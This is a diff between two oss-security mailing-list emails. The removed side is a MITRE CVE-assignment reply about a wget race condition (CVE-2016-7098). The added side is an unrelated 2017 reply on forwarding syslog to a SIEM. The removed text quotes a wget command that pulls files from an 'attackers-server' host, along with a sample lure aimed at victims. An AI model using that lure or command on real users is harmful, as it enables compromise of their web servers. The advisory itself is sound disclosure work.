@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5947" "Saturday" "27" "August" "2016" "15:08:07" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160827190807.536C66C54F4@smtpvmsrv1.mitre.org>" "134" "[oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability" "^Cc:" nil nil "8" "2016082719:08:07" "[oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability" (number mark "        cve-assign@m Aug 27  134/5947  " thread-indent "\"[oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability\"\n") "<F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>" ("<F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2570" "Tuesday" "1" "August" "2017" "17:33:05" "+0000" "Mikhail Utin" "mikhailutin@hotmail.com" "<DM5PR11MB1643FD13FC37124F61525567AAB30@DM5PR11MB1643.namprd11.prod.outlook.com>" "70" "Re: [oss-security] Syslog forwarding with IP spoofing" "^Date:" nil nil "8" "2017080117:33:05" "[oss-security] Syslog forwarding with IP spoofing" (number mark "U       mikhailutin@ Aug  1   70/2570  " thread-indent "\"Re: [oss-security] Syslog forwarding with IP spoofing\"\n") "<20170801170637.GA15254@openwall.com>" ("<1501597640.407871.9894.30815@mail.rambler.ru>" "<1501597646.744346.23695.25373@mail.rambler.ru>" "<20170801170637.GA15254@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 24028 invoked by uid 550); 27 Aug 2016 19:08:20 -0000
+Received: (qmail 9684 invoked by uid 550); 1 Aug 2017 17:38:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,147 +11,122 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 24010 invoked from network); 27 Aug 2016 19:08:19 -0000
-In-Reply-To: <F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>
-Message-Id: <20160827190807.536C66C54F4@smtpvmsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Sat, 27 Aug 2016 15:08:07 -0400 (EDT)
-From: cve-assign@mitre.org
+Received: (qmail 7233 invoked from network); 1 Aug 2017 17:33:19 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
+ s=selector1; h=From:Date:Subject:Message-ID:Content-Type:MIME-Version;
+ bh=v83UpKhYDc+KV0f1S0b/K0wQ5gR/LolhRmBvPz6I/JI=;
+ b=npQrJDHmzPM69JgTTahynQjBsp6WwKKlfwGH7kGOQL7dUECZurXlQEzW21lq38R21NBmunlq7XcZZJorMajyvVAUTM3dcuxatkJcGm55W52rQ0dAgntFQ8E81GAXBcSOqEqGSwNHnMkDcAIfUDkRH3rMAhFJu78dceqwMpJbNDDfI81vrccWOEhyLq7b3UhQYP8ltF8gs3+EzLRTkF+sB+A54KABTF/aG9EQmbQtZ44SUU2hKv8LsmPetVqmCCHOu3jQNE3O2776zf3hQWbkGkWFwymxGnFm9Ha19z6a2/+WiKumyhVFGF8jLEL+zSsvrgJb7rKBCdCTtwmkhK0M3w==
+Thread-Topic: [oss-security] Syslog forwarding with IP spoofing
+Thread-Index: AQHTCuc/+JBjr0E+rkmdTuq7GA/BhaJvu0OAgAAC1pM=
+Message-ID: <DM5PR11MB1643FD13FC37124F61525567AAB30@DM5PR11MB1643.namprd11.prod.outlook.com>
+References: <1501597640.407871.9894.30815@mail.rambler.ru>
+ <1501597646.744346.23695.25373@mail.rambler.ru>,<20170801170637.GA15254@openwall.com>
+In-Reply-To: <20170801170637.GA15254@openwall.com>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+authentication-results: lists.openwall.com; dkim=none (message not signed)
+ header.d=none;lists.openwall.com; dmarc=none action=none
+ header.from=hotmail.com;
+x-incomingtopheadermarker: OriginalChecksum:B356E58FC59689E4E880CBE63470CF9735F2D63C7280ECD6562BD05B618297F2;UpperCasedChecksum:0BC3420998FC418CC947E378C0C2B6CC3F42262E7AFCC931D5556092063481A9;SizeAsReceived:7259;Count:45
+x-ms-exchange-messagesentrepresentingtype: 1
+x-tmn: [nidzdJ83g5bb2eIL+Gkm5FYe4r6gQSBU]
+x-ms-publictraffictype: Email
+x-microsoft-exchange-diagnostics: 1;CO1NAM04HT026;7:1VD25XYB8zTEaGD0qPzNLZswbvIIxL/uhzBhe60bjNBaQKoRN24dtykhiHCprqy0Z/47KlWQ4WR+sxCTxVbtkkTJLQYnV7bG5mEUj1L4oxg7An/pIgjgefPvCh0VNNtZhQs+t5EcfcHo6YnLSZGjbSdTPbNlr/amtfB0Mcqe93TXkOXn4SbnjD9C7Z5H7A1OTfjkzjvsQiIBuRy6R0V1SQSYOoowFFympaMW58elhGb+DfIXpv78XDCAOo+x2MalxkRZJ+pN+mljVhn8OO1moPEtxXXOHRvDYvqx0eyk6dreh4WB4VtNYPJyvD2aqeazVYD6btSLpz9BT0Yb7M2lM3jjHQpW5YamiBTUP48M88xtE22ndQ+Upger/gs6zI/qzv/XyLb6Q73XwWiJbq3LyV60YHk5/P9z/z0u5YGb79FOGd8VayBCcR9IRzQFbch5GRAc8aiuXoQ9tLvGLMj3wGEP8cwzv0vwUF/WhK6mcPv4NnRzEsFBvv+urT0q0cu+tutLlrExFo6y4ZOKRCr38ylxHextu2DYrcq7eOLQJ4K2uN/turGNQ/mw6mBg7zfg2fr+mA0RW0YAobJZyWRZEPicD/Q6KRC5HTYCvglvHJnCr6dfVGFGoBhldSU0o4isC2nEorGJ2FAPS/kYV6+xxNowRmbFuJJh9vY1kWLeikMf3r5shDJ/QfZab1h8NvEmjWlDyrxRIBi+wH83KKogZga4ptU6UW7Zzq/xVJOueNd33SyzreEXl70MYQkEsBMknLiQpWbtpCDF8HVQRNjR4w==
+x-incomingheadercount: 45
+x-eopattributedmessage: 0
+x-forefront-antispam-report: EFV:NLI;SFV:NSPM;SFS:(7070007)(98901004);DIR:OUT;SFP:1901;SCL:1;SRVR:CO1NAM04HT026;H:DM5PR11MB1643.namprd11.prod.outlook.com;FPR:;SPF:None;LANG:en;
+x-ms-office365-filtering-correlation-id: 8ba25458-3327-4d70-676e-08d4d9035e66
+x-microsoft-antispam: UriScan:;BCL:0;PCL:0;RULEID:(300000500095)(300135000095)(300000501095)(300135300095)(22001)(300000502095)(300135100095)(300000503095)(300135400095)(201702061074)(5061506573)(5061507331)(1603103135)(2017031320274)(2017031324274)(2017031323274)(2017031322377)(1601125374)(1603101448)(1701031045)(300000504095)(300135200095)(300000505095)(300135600095)(300000506095)(300135500095);SRVR:CO1NAM04HT026;
+x-ms-traffictypediagnostic: CO1NAM04HT026:
+x-exchange-antispam-report-test: UriScan:(192374486261705)(194151415913766)(5213294742642);
+x-exchange-antispam-report-cfa-test: BCL:0;PCL:0;RULEID:(100000700101)(100105000095)(100000701101)(100105300095)(100000702101)(100105100095)(444000031);SRVR:CO1NAM04HT026;BCL:0;PCL:0;RULEID:(100000800101)(100110000095)(100000801101)(100110300095)(100000802101)(100110100095)(100000803101)(100110400095)(100000804101)(100110200095)(100000805101)(100110500095);SRVR:CO1NAM04HT026;
+x-forefront-prvs: 0386B406AA
+spamdiagnosticoutput: 1:99
+spamdiagnosticmetadata: NSPM
+Content-Type: multipart/alternative;
+	boundary="_000_DM5PR11MB1643FD13FC37124F61525567AAB30DM5PR11MB1643namp_"
+MIME-Version: 1.0
+X-OriginatorOrg: hotmail.com
+X-MS-Exchange-CrossTenant-originalarrivaltime: 01 Aug 2017 17:33:05.4543
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Internet
+X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: CO1NAM04HT026
+Date: Tue, 1 Aug 2017 17:33:05 +0000
+From: Mikhail Utin <mikhailutin@hotmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability
-To: dmisra@verisign.com, dawid@legalhackers.com
+Subject: Re: [oss-security] Syslog forwarding with IP spoofing
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+--_000_DM5PR11MB1643FD13FC37124F61525567AAB30DM5PR11MB1643namp_
+Content-Type: text/plain; charset="koi8-r"
+Content-Transfer-Encoding: quoted-printable
 
-> Wget Race Condition Recursive Download Accesslist Race Condition Vulnerability
+Hello,
 
-Our perspective is that this is a very marginal issue for CVE
-inclusion. Exploitation requires the victim to specify a potentially
-dangerous file on the command line, and to enter this command line
-while the current working directory is served by a web server. Also,
-the observed behavior isn't directly inconsistent with the
-documentation. However, the vendor apparently recognizes some security
-risk and has decided to publish a patch described in the
-http://lists.gnu.org/archive/html/bug-wget/2016-08/msg00134.html post.
+Indeed, it is our of this list topic.
 
-Use CVE-2016-7098.
+Options for The Alexander:
 
-> wget -r -nH -A '*.jpg' http://attackers-server/test.php
-
-Maybe a marginally realistic exploitation scenario is for the
-attacker to convey this message to potential victims:
-
-  I wrote a blog post about my summer vacation at
-  http://attackers-server/vacation.php - this has links to dozens
-  of photos that are .jpg files. If you have a slideshow application
-  on your own server and just want to look at my photos, a simple
-  method is to cd to your DocumentRoot directory, then cd to your
-  slideshow directory underneath that, and then type this command:
-
-     wget -r -nH -A '*.jpg' http://attackers-server/vacation.php
-
-This is only marginally realistic for the following reasons:
-
-  - It seems very odd to set one's working directory to a place
-    underneath DocumentRoot, and then run wget with an untrusted .php
-    URL on the command line - especially because the wget
-    documentation is ambiguous (see below).
-
-  - People don't ordinary ask their web-site visitors to create their
-    own alternative content views (e.g., slideshows) on the visitors'
-    web servers.
-
-  - People don't ordinarily expect their web-site visitors to feel
-    comfortable with wget commands. If they wanted to share a .jpg
-    collection, they would probably create a .zip of it.
-
-  - Although wget of an untrusted .php file with "-A '*.jpg'" might be
-    somewhat common, it is probably not common for this to occur
-    with a working directory under DocumentRoot. It seems to require
-    an obscure use case in which the victim wants to mirror the .jpg
-    files, but is willing to expend extra effort to host a unique web
-    presentation of those .jpg files, just because mirroring the
-    complete original presentation might be unsafe.
-
-> the victim server's security is impacted since the
-> developer/administrator was never warned explicitly that 'rejected
-> files' can have a transient life on the victim server
-
-The documentation only says "Specify comma-separated lists of file
-name suffixes or patterns to accept or reject" during the recursive
-retrieving. It does not discuss what happens to the filename that was
-explicitly entered on the command line (stored forever, stored
-temporarily, or never stored). It seems that, in many cases, a user
-would prefer that file to be stored forever, so that they don't have
-to create their own unique presentation. For example,
-
-   wget -r -nH -A '*.jpg' http://attackers-server/vacation.html
-
-can easily be interpreted to mean "I want to mirror the top-level
-presentation file vacation.html, and I also want to mirror every .jpg
-file that it references. I don't want a huge download time, so I've
-decided to accept only the .jpg files, and not the .mp3 files of
-birdsongs heard during the vacation, .mp4 movies of the birds, etc."
-Probably wget has never supported that, but still it might be the
-expected behavior.
+  1.  Normal SIEM will work with syslog as it is widely supported format an=
+d will know where the log comes from by data source configuration.
+  2.  The "open source tool" is Perl, you can create any log format from an=
+y data sources and then send to SIEM.
+  3.  Talk to SIEM tech support. Good vendor will advise. If you do not hav=
+e SIEM, buy LogRhythm. That should work. Freeware OSSIM I would bet will wo=
+rk with syslog as well.
+  4.  Alexander can email me mikhailutin@hotmail.com for details.
 
 
-> http://git.savannah.gnu.org/cgit/wget.git/commit/?id=9ffb64ba6a8121909b01e984deddce8d096c498d
-> http://git.savannah.gnu.org/cgit/wget.git/commit/?id=690c47e3b18c099843cdf557a0425d701fca4957
-
-Also, we're not sure how the 'asprintf (&tmp, "%s.tmp",
-hs->local_file);' is supposed to interact with
-http://httpd.apache.org/docs/current/mod/mod_mime.html#multipleext --
-file.php.tmp is not necessarily a safe naming convention.
-
-Finally, the patch does not address all possible security risks. For
-example, if the victim's working directory is under DocumentRoot and
-the victim is logged into the account used by the web server, then
-there is still a possibility of malicious content from a
-
-  wget -r -nH -A '*.jpg' http://attackers-server/vacation.html
-
-command (e.g., malicious JavaScript). There is no CVE ID for that.
+Mikhail Utin, CISSP
 
 
-> http://www.openwall.com/lists/oss-security/2016/08/12/7
+________________________________
+From: Solar Designer <solar@openwall.com>
+Sent: Tuesday, August 1, 2017 13:06
+To: =E1=CC=C5=CB=D3=C1=CE=C4=D2 =EE=CF=D3=C1=D2=C5=D7
+Cc: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Syslog forwarding with IP spoofing
 
-> We addressed this issue in wget2 - files just needed for parsing are kept in 
-> memory and never appear in the file system.
+Hi all,
 
-Again, interpreting "-A '*.jpg' http://attackers-server/vacation.html"
-to mean no mirroring of vacation.html is a potential usability
-problem. Ideally, there might be separate options for the different
-use cases, e.g., something like
+On Tue, Aug 01, 2017 at 05:27:26PM +0300, =E1=CC=C5=CB=D3=C1=CE=C4=D2 =EE=
+=CF=D3=C1=D2=C5=D7 wrote:
+> I need to recive syslog messages, filter them and send them forward to the
+> SIEM.
+>
+> Also HOST field is not represented in syslog, so i need to spoof IP of
+> forwarding
+> packets to bind messages recived by SIEM to it's original source IP.
+>
+> If i will try to add some marks to syslog message, I will need to override
+> parsers for each syslog source type, so it seems like abad idea.
+>
+> Is there any open source tool for that task?
 
-  --also-accept-the-file-named-on-the-command-line
+Somehow we almost didn't have this sort of messages - someone seeking an
+open source security tool - sent in here so far.  Do we want them in
+here going forward?  The current list content guidelines do not address
+this possibility, as it certainly wasn't the purpose of the oss-security
+list so far.  Is there another mailing list where the above message
+would have been more appropriate?
 
-or
+http://oss-security.openwall.org/wiki/mailing-lists/oss-security#list-conte=
+nt-guidelines
+mailing-lists:oss-security [OSS-Security]<http://oss-security.openwall.org/=
+wiki/mailing-lists/oss-security#list-content-guidelines>
+oss-security.openwall.org
+The purpose of the Open Source Security (oss-security) group is to encourag=
+e public discussion of security flaws, concepts, and practices in the Open =
+Source community.
 
-  --do-not-also-accept-the-file-named-on-the-command-line
 
-(but preferably with shorter option names!).
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+Meanwhile, please feel free to address the actual question about the
+tool.  (I don't know of such a tool.)
 
-iQIcBAEBCAAGBQJXweQ3AAoJEHb/MwWLVhi2gLoQAJP6vGruKoD5iwKEUrLFCsGC
-0Dv8rApnGy+3atwQ84KlFIBsvcWcFpk5ttvqlhLZtRVft+qdlPKp6a5xQEDx51RZ
-qhV+LMBvCRXU1vJAKTRoJa3VwLYHTfGUj5nMT+rBgKqvcxXE+Xe9FYvHB+m+iLUk
-TFBRqVJRsWSNNkouOaCThoIoHuDDLX7W9WEn0PyAi2aNoxywOHjXVwuH32Zw7D96
-L8X4aN8Q54bdnpOc3jrO6RssgesNxpycZVvreXGIMR4/zM2xMmMegVr6RvQhLPe2
-J2xh5p0mq000W5zMo1Qic56TGAmyutGHhDSewcuax8VYBIar1zmLKHH13AMfpECR
-OKeNeFE1khi1xYQggm07KhCWGhORPD8HqF6GVQGZQh4nGRHyS2m3ePssSdL01RSg
-ZcJyOgPT8Bo8jk25i7t23RoTYXJQXLjtiMI4z28wXoxf43j6obzxHhFBHBEMNk9p
-1kJZvF5jMbJNywUVFbo5D5IWlsb51LeGo7Rzy4GOG3Mgcagv414RDEfh7167UC6i
-MuyZ+JgFHhEsaiyPyaxl+En4BxMiqhG/fvE0lo0SZ3omjj0t6soPqS+Vl8uQDdva
-VdT8VRdPMrR7+acdTjKQmhnkyOOXSYidRM7ToTCmd/VNSyZXzeuNEvDckUVSyyTS
-n8lsLYdoKuIH5H8NIJ8c
-=rqtj
------END PGP SIGNATURE-----
+Alexander
+
+--_000_DM5PR11MB1643FD13FC37124F61525567AAB30DM5PR11MB1643namp_--
